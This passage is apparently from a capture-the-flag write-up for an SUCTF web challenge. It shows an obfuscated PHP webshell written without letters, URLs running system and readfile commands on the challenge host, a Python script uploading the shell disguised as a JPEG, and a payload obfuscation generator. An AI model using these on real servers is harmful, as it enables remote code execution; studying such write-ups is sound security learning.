</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?=</span> $_<span style=color:#f92672>=</span><span style=color:#a6e22e>_</span><span style=color:#f92672>==</span><span style=color:#a6e22e>_</span>;$__<span style=color:#f92672>=~</span><span style=color:#a6e22e>一</span>[$_];$___<span style=color:#f92672>=~</span><span style=color:#a6e22e>了</span>[$_];$____<span style=color:#f92672>=~</span><span style=color:#a6e22e>端</span>[$_];$_<span style=color:#f92672>=</span><span style=color:#a6e22e>_</span><span style=color:#f92672>.</span>$__<span style=color:#f92672>.</span>$___<span style=color:#f92672>.</span>$____;$_<span style=color:#f92672>=</span>$$_;$_[<span style=color:#a6e22e>_</span>]($_[<span style=color:#a6e22e>__</span>]);
</span></span></code></pre></td></tr></table></div></div><p>详细注释：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-11-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-11-10>10</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span>$_<span style=color:#f92672>=</span><span style=color:#a6e22e>_</span><span style=color:#f92672>==</span><span style=color:#a6e22e>_</span>;<span style=color:#75715e>//1
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$__<span style=color:#f92672>=~</span><span style=color:#a6e22e>一</span>[$_];<span style=color:#75715e>//G
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$___<span style=color:#f92672>=~</span><span style=color:#a6e22e>了</span>[$_];<span style=color:#75715e>//E
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$____<span style=color:#f92672>=~</span><span style=color:#a6e22e>端</span>[$_];<span style=color:#75715e>//T
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$_<span style=color:#f92672>=</span><span style=color:#a6e22e>_</span><span style=color:#f92672>.</span>$__<span style=color:#f92672>.</span>$___<span style=color:#f92672>.</span>$____;<span style=color:#75715e>//_GET
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$_<span style=color:#f92672>=</span>$$_;<span style=color:#75715e>//$_GET
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>$_[<span style=color:#a6e22e>_</span>]($_[<span style=color:#a6e22e>__</span>]);<span style=color:#75715e>//$_GET[_]($_GET[__]);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#f92672>------------------------------------------------------</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>http</span><span style=color:#f92672>://</span><span style=color:#a6e22e>web</span><span style=color:#f92672>.</span><span style=color:#a6e22e>suctf</span><span style=color:#f92672>.</span><span style=color:#a6e22e>asuri</span><span style=color:#f92672>.</span><span style=color:#a6e22e>org</span><span style=color:#f92672>:</span><span style=color:#ae81ff>82</span><span style=color:#f92672>/</span><span style=color:#a6e22e>upload</span><span style=color:#f92672>/</span><span style=color:#ae81ff>54</span><span style=color:#a6e22e>add22477b7aec5a09a6e2a280464fb</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#f92672>?</span><span style=color:#a6e22e>_</span><span style=color:#f92672>=</span><span style=color:#a6e22e>assert</span><span style=color:#f92672>&amp;</span><span style=color:#a6e22e>__</span><span style=color:#f92672>=</span><span style=color:#a6e22e>phpinfo</span>();
</span></span></code></pre></td></tr></table></div></div><p>读取flag</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-1>1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-2>2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-3>3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-4>4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-12-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-12-5>5</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>view</span><span style=color:#f92672>-</span><span style=color:#a6e22e>source</span><span style=color:#f92672>:</span><span style=color:#a6e22e>http</span><span style=color:#f92672>://</span><span style=color:#a6e22e>web</span><span style=color:#f92672>.</span><span style=color:#a6e22e>suctf</span><span style=color:#f92672>.</span><span style=color:#a6e22e>asuri</span><span style=color:#f92672>.</span><span style=color:#a6e22e>org</span><span style=color:#f92672>:</span><span style=color:#ae81ff>82</span><span style=color:#f92672>/</span><span style=color:#a6e22e>upload</span><span style=color:#f92672>/</span><span style=color:#ae81ff>54</span><span style=color:#a6e22e>add22477b7aec5a09a6e2a280464fb</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php</span><span style=color:#f92672>?</span><span style=color:#a6e22e>_</span><span style=color:#f92672>=</span><span style=color:#a6e22e>assert</span><span style=color:#f92672>&amp;</span><span style=color:#a6e22e>__</span><span style=color:#f92672>=</span><span style=color:#a6e22e>system</span>(<span style=color:#f92672>%</span><span style=color:#ae81ff>22</span><span style=color:#a6e22e>ls</span><span style=color:#f92672>%</span><span style=color:#ae81ff>20</span><span style=color:#f92672>-</span><span style=color:#a6e22e>l</span><span style=color:#f92672>%</span><span style=color:#ae81ff>20</span><span style=color:#f92672>/%</span><span style=color:#ae81ff>22</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>http</span><span style=color:#f92672>://</span><span style=color:#a6e22e>web</span><span style=color:#f92672>.</span><span style=color:#a6e22e>suctf</span><span style=color:#f92672>.</span><span style=color:#a6e22e>asuri</span><span style=color:#f92672>.</span><span style=color:#a6e22e>org</span><span style=color:#f92672>:</span><span style=color:#ae81ff>82</span><span style=color:#f92672>/</span><span style=color:#a6e22e>upload</span><span style=color:#f92672>/</span><span style=color:#ae81ff>54</span><span style=color:#a6e22e>add22477b7aec5a09a6e2a280464fb</span><span style=color:#f92672>.</span><span style=color:#a6e22e>php</span><span style=color:#f92672>?</span><span style=color:#a6e22e>_</span><span style=color:#f92672>=</span><span style=color:#a6e22e>assert</span><span style=color:#f92672>&amp;</span><span style=color:#a6e22e>__</span><span style=color:#f92672>=</span><span style=color:#a6e22e>readfile</span>(<span style=color:#f92672>%</span><span style=color:#ae81ff>27</span><span style=color:#f92672>/</span><span style=color:#a6e22e>Th1s_14_f14g</span><span style=color:#f92672>%</span><span style=color:#ae81ff>27</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>SUCTF</span>{<span style=color:#a6e22e>KyGeBLWoF9MXcdDKBdbw2B54sMxbsxyXBpm8t5nQUHBJKuAYEd6o</span>}
</span></span></code></pre></td></tr></table></div></div><p>上传小脚本</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-13-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-13-15>15</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#coding:utf8</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> re
</span></span><span style=display:flex><span>data<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&lt;?= $_=_==_;$__=~一[$_];$___=~了[$_];$____=~端[$_];$_=_.$__.$___.$____;$_=$$_;$_[_]($_[__]);&#34;</span>
</span></span><span style=display:flex><span>base<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://web.suctf.asuri.org:82/&#34;</span>
</span></span><span style=display:flex><span>files <span style=color:#f92672>=</span> {<span style=color:#e6db74>&#39;file&#39;</span>: (<span style=color:#e6db74>&#39;findneo.php&#39;</span>, data, <span style=color:#e6db74>&#39;image/jpeg&#39;</span>)}
</span></span><span style=display:flex><span>content <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(base<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;upload.php&#34;</span>, files<span style=color:#f92672>=</span>files)<span style=color:#f92672>.</span>text
</span></span><span style=display:flex><span>cmd<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;system(&#34;dir /&#34;);&#39;</span>
</span></span><span style=display:flex><span>payload<span style=color:#f92672>=</span>base<span style=color:#f92672>+</span>re<span style=color:#f92672>.</span>match(<span style=color:#e6db74>&#34;[\s\S]*Stored in: ([a-z.0-9/]+)[\s\S]*&#34;</span>,content)<span style=color:#f92672>.</span>group(<span style=color:#ae81ff>1</span>)<span style=color:#f92672>+</span><span style=color:#e6db74>&#34;?_=assert&amp;__=&#34;</span><span style=color:#f92672>+</span>cmd
</span></span><span style=display:flex><span>print payload
</span></span><span style=display:flex><span>print requests<span style=color:#f92672>.</span>get(payload)<span style=color:#f92672>.</span>content
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># http://web.suctf.asuri.org:82/upload/54add22477b7aec5a09a6e2a280464fb.php?_=assert&amp;__=system(&#34;dir /&#34;);</span>
</span></span><span style=display:flex><span><span style=color:#75715e># 1Th1s_14_f14g  boot  etc   lib	 media	opt   root  sbin  sys  usr</span>
</span></span><span style=display:flex><span><span style=color:#75715e># bin	      dev   home  lib64  mnt	proc  run   srv   tmp  var</span>
</span></span></code></pre></td></tr></table></div></div><p>写了一个用上述方法生成任意字母构成的字符串的小程序：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-14-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-14-30>30</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e># coding: UTF-8</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Author: &#39;findneo&#39;</span>
</span></span><span style=display:flex><span><span style=color:#75715e># compose php code from limited whitelist: $()[]_~=;.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>gendict</span>(index<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;_==_&#39;</span>,target_chars<span style=color:#f92672>=</span>[chr(i) <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>0x20</span>,<span style=color:#ae81ff>0x7f</span>)]):
</span></span><span style=display:flex><span>    sentence<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;如是我闻。一时薄伽梵。住王舍城鹫峰山顶。与大苾刍众千二百五十人俱。皆阿罗汉。诸漏已尽无复烦恼得真自在心善解脱慧善解脱。如调慧马亦如大龙。已作所作已办所办。弃诸重担逮得己利。尽诸有结正知解脱。至心自在第一究竟。除阿难陀独居学地得预流果。大迦叶波而为上首。复有五百苾刍尼众。皆阿罗汉。大胜生主而为上首。复有无量邬波索迦、邬波斯迦。皆见圣谛。复有无量无数菩萨摩诃萨众。一切皆得陀罗尼门三摩地门。住空无相无分别愿。已得诸法平等性忍。具足成就四无碍解。凡所演说辩才无尽。于五神通自在游戏。所证智断永无退失。言行威肃闻皆敬受。勇猛精进离诸懈怠。能舍亲财不顾身命。离矫离诳无染无求。等为有情而宣正法。契深法忍穷最极趣。得无所畏其心泰然。超众魔境出诸业障。摧灭一切烦恼怨敌。建正法幢伏诸邪论。声闻独觉不能测量。得心自在得法自在。业惑见障皆已解脱。择法辩说无不善巧。入深缘起生灭法门。离见随眠舍诸缠结。智慧通达诸圣谛理。曾无数劫发弘誓愿。容貌熙怡先言接引。远离颦蹙辞韵清和。赞颂善巧辩才无滞。处无边众威德肃然。抑扬自在都无所畏。多俱胝劫巧说无尽。于诸法门胜解观察。如幻如阳焰。如梦如水月。如响如空花。如像如光影。如变化事。如寻香城。虽皆无实而现似有。离下劣心说法无畏。能随证入无量法门。善知有情心行所趣。以微妙慧而度脱之。于诸有情心无挂碍。成就最上无生法忍。善入诸法平等性智。甚深法性能如实知。随其所应巧令悟入。能善宣说缘起法门。摄受无边佛国大愿。于十方界无数诸佛。等持正念常现在前。诸佛出世皆能历事。亦能劝请转正法轮。不般涅槃度无量众善能伏灭一切有情种种见缠诸烦恼焰。须臾游戏百千等持。引发无边殊胜功德。此诸菩萨具如是等妙功德海。设经无量俱胝大劫。叹不能尽。其名曰贤守菩萨摩诃萨。宝性菩萨摩诃萨。宝藏菩萨摩诃萨。宝授菩萨摩诃萨。导师菩萨摩诃萨。仁授菩萨摩诃萨。星授菩萨摩诃萨。神授菩萨摩诃萨。帝授菩萨摩诃萨。广慧菩萨摩诃萨。胜慧菩萨摩诃萨。上慧菩萨摩诃萨。增长慧菩萨摩诃萨。无边慧菩萨摩诃萨。不虚见菩萨摩诃萨。无障慧菩萨摩诃萨。善发趣菩萨摩诃萨。善勇猛菩萨摩诃萨。极精进菩萨摩诃萨。常精进菩萨摩诃萨。常加行菩萨摩诃萨。不舍轭菩萨摩诃萨。日藏菩萨摩诃萨。月藏菩萨摩诃萨。无比慧菩萨摩诃萨。观自在菩萨摩诃萨。得大势菩萨摩诃萨。妙吉祥菩萨摩诃萨。宝印手菩萨摩诃萨。摧魔力菩萨摩诃萨。金刚慧菩萨摩诃萨。金刚藏菩萨摩诃萨。常举手菩萨摩诃萨。大悲心菩萨摩诃萨。大庄严菩萨摩诃萨。庄严王菩萨摩诃萨。山峰菩萨摩诃萨。宝峰菩萨摩诃萨。德王菩萨摩诃萨。慈氏菩萨摩诃萨。如是等无量百千俱胝那庾多菩萨摩诃萨。皆法王子堪绍佛位而为上首。尔时世尊于师子座上。自敷尼师坛结跏趺坐。端身正愿住对面念。入等持王妙三摩地。诸三摩地皆摄入此三摩地中。是所流故。尔时世尊正知正念。从等持王安庠而起。以净天眼观察十方殑伽沙等诸佛世界。举身怡悦。从两足下千辐轮相。各放六十百千俱胝那庾多光。从足十指。两趺两跟。四踝两胫。两腨两膝。两股。腰胁腹背。脐中心上胸臆德字。两乳两腋。两肩两髆。两肘两臂。两腕两手。两掌十指。项咽颐颔。颊额头顶两眉两眼。两耳两鼻。口四牙。四十齿。眉间毫相。一一身分。各放六十百千俱胝那庾多光。此一一光各照三千大千世界。从此展转遍照十方殑伽沙等诸佛世界。其中有情遇斯光者。必得无上正等菩提。尔时世尊一切毛孔皆悉熙怡。各出六十百千俱胝那庾多光。是一一光各照三千大千世界。从此展转遍照十方殑伽沙等诸佛世界。其中有情遇斯光者。必得无上正等菩提。尔时世尊演身常光照此三千大千世界。从此展转遍照十方殑伽沙等诸佛国土。其中有情遇斯光者。必得无上正等菩提。尔时世尊从其面门出广长舌相。遍覆三千大千世界。熙怡微笑。复从舌相流出无量百千俱胝那庾多光。其光杂色。从此杂色一一光中。现宝莲花。其花千叶皆真金色。众宝庄严。绮饰鲜荣。甚可爱乐。香气芬烈。周流普熏。细滑轻软。触生妙乐。诸花台中皆有化佛结跏趺坐。演妙法音。一一法音。皆说般若波罗蜜多相应之法。有情闻者必得无上正等菩提。从此展转。流遍十方殑伽沙等诸佛世界。说法利益亦复如是。&#34;</span>
</span></span><span style=display:flex><span>    parse_byte<span style=color:#f92672>=</span><span style=color:#66d9ef>lambda</span> c:[<span style=color:#f92672>~</span>i<span style=color:#f92672>%</span><span style=color:#ae81ff>256</span> <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> bytes(c, encoding<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;utf-8&#39;</span>)][<span style=color:#ae81ff>1</span>]
</span></span><span style=display:flex><span>    d<span style=color:#f92672>=</span>dict()
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> k <span style=color:#f92672>in</span> sentence:
</span></span><span style=display:flex><span>        j<span style=color:#f92672>=</span>parse_byte(k)
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> chr(j) <span style=color:#f92672>in</span> target_chars <span style=color:#f92672>and</span> chr(j) <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> d<span style=color:#f92672>.</span>keys():
</span></span><span style=display:flex><span>            d[chr(j)]<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;~</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>[</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>]&#34;</span><span style=color:#f92672>.</span>format(k,index)
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> d
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>gencode</span>(code):
